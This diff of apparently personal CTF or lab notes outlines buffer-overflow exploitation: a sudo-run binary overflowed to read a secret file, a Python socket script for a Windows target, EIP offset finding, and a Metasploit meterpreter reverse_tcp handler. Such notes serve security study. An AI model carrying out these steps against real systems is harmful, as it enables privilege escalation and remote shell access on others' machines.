@@ -321,10 +321,28 @@ replace old shellcode with new shellcode
 run on cmd not dbg sudo ./inventory.exe <<< $(python /home/comrade/ctflin.py)
 (inventory.exe can be ran as sudo to invike root perms and your using a running prgram iot have a buffer to overflow and that overflow will take advantage of root perms and rum cmd cat /.secret/.veryseceret.pdb)
 
+#  WINDOWS EXPLOIT
+```
+static analisys (strings, file commands)
+create a python sript
+  1 #!/usr/bin/env python
+  2 import socket
+  3 buf = " "
+  4 s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) ## creatinng socket IPv4 TCP
+  5 s.connect(("192.168.65.10",9999)) ## define host & port
+  6 print s.recv(1024) ## print to screen the response
+  7 s.send(buf) ## send variable buf
+  8 print s.recv(1024) ## print to screen the response
+  9 s.close() ## close socket
 
-
-
-
+open imunity
+go to wiremask type 5000 for buffer size copy and paste onto script, once script executes copy eip to register value(in this case offset was 2003 so on script change to (A * 2003) (also add another line with BBBB if successful eip = 42424242)
+msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 0.0.0.0
+set lport 4444
+```
 
 
 
